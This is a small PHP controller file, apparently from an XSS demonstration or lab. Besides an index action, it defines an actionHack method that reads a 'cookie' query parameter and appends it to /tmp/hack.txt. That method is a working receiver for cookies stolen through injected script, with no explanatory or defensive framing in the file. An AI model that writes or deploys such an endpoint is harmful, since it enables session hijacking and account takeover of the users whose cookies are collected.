<?php

class IndexController
{
    public function actionIndex()
    {
        include VIEWS_PATH . '/index.php';
    }

    public function actionHack()
    {
    	$cookie = $_GET['cookie'];
    	file_put_contents('/tmp/hack.txt', $cookie . "\n", FILE_APPEND);
    }
}

